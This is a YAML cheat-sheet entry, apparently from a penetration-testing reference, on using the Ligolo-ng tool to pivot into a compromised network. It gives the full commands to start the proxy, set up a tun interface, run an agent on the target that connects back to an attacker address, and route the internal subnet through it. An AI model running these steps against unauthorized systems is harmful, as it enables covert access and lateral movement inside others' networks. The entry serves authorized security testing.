---
description: |
  Ligolo is an advanced tunneling tool designed for red teaming and penetration testing. It enables attackers to establish reverse tunnels and pivot within a compromised network. The advantage of this tool is that the traffic is tunneled and you can run commands on the compromised network without added proxychains in the front of the command.

  Command Reference:
  ```
  Port: 8008

  IP address to which the agent must connect: 0.0.0.0

  Compromised network you want access to: 172.16.10.0/24
  ```
command: |
  ligolo-proxy -selfcert -laddr 0.0.0.0:8008

code: |
  Create tap interface for ligolo:
  sudo ip tuntap add user root mode tun ligolo
  sudo ip link set ligolo up

  On target machine run the agent:
  ./agent -connect 192.168.49.52:8008 -ignore-cert

  Add internal route of target device to ligolo interface:
  sudo ip route add 172.16.10.0/24 dev ligolo


items:
  - Shell
services:
  - 
OS:
  - Windows
  - Linux
attack_types:
  - General
  - Exploitation
references:
  - https://github.com/nicocha30/ligolo-ng
---